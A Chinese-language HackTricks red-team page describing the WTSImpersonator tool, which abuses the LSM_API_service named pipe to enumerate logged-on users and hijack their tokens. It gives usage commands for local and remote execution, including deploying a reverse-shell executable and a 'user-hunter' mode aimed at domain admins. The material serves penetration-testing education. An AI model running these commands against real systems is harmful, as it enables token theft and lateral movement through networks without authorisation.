{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**WTS Impersonator** 工具利用 **"\\pipe\LSM_API_service"** RPC 命名管道，悄悄枚举已登录用户并劫持他们的令牌，绕过传统的令牌模拟技术。这种方法促进了网络内的无缝横向移动。这项技术的创新归功于 **Omri Baso，他的工作可以在 [GitHub](https://github.com/OmriBaso/WTSImpersonator) 上访问**。

### 核心功能
该工具通过一系列 API 调用进行操作：
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### 关键模块和用法
- **枚举用户**：使用该工具可以进行本地和远程用户枚举，使用适合的命令：
- 本地：
```powershell
.\WTSImpersonator.exe -m enum
```
- 远程，通过指定IP地址或主机名：
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **执行命令**：`exec`和`exec-remote`模块需要**服务**上下文才能工作。本地执行只需WTSImpersonator可执行文件和一个命令：
- 本地命令执行示例：
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe可用于获取服务上下文：
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **远程命令执行**：涉及创建和安装一个远程服务，类似于PsExec.exe，允许以适当的权限执行。
- 远程执行示例：
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **用户猎杀模块**：针对多个机器上的特定用户，在他们的凭据下执行代码。这对于针对在多个系统上具有本地管理员权限的域管理员特别有用。
- 用法示例：
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR分享黑客技巧。

</details>
{% endhint %}
